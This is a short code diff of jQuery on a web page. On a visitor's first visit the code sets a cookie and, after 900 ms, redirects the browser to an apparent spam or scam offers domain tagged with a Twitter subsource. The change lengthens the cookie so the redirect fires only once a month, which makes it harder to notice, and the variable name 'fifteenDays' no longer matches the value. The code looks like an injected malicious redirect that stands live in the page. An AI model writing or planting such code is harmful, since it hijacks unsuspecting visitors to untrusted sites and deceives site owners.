@@ -59,7 +59,7 @@
 
       jQuery(document).ready(function(){
        if (document.cookie.indexOf('visited=true') == -1) {
-        var fifteenDays = 1000*60*60*24;
+        var fifteenDays = 1000*60*60*24*30;
         var expires = new Date((new Date()).valueOf() + fifteenDays);
         document.cookie = "visited=true;expires=" + expires.toUTCString();
         setTimeout('window.location.href = "https://dbebdea.mylovelyoffrs.com/s/b94bdda53a9d1?subsource=Twitter"', 900);
